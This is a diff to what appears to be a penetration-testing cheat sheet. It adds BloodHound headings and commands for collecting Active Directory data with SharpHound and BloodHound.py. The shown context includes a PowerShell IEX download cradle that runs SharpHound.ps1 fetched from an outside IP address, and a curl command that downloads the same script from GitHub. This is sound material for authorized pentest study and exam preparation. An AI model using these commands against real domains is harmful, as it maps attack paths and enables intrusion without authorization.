@@ -798,6 +798,8 @@ Import-module .\activedirectory.psd1
 get-netgpo
 get-netgpo -computer server01
 ```
+# BLOODHOUND
+## TECHNIQUES
 ##### BLOODHOUND - PYTHON
 ```
 git clone https://github.com/fox-it/BloodHound.py
@@ -812,7 +814,13 @@ bloodhound-python -u username -p password -dc xx.aa.com --disable-auto-gc -d aa.
 ```
 IEX (New-Object System.Net.WebClient).DownloadString("http://175.12.80.10:8080/SharpHound.ps1")
 Invoke-BloodHound 
+invoke-Bloodhound -collectionmethod all
 ```
+```
+curl https://github.com/n0ts0cial/oscp/raw/main/SharpHound.ps1  -Outfile SharpHound.ps1
+import-module .\SharpHound.ps1
+```
+
 ```
 INvoke-Bloodhound -Collectionmethod All
 Invoke-BloodHound -CollectionMethod ACL,ObjectProps
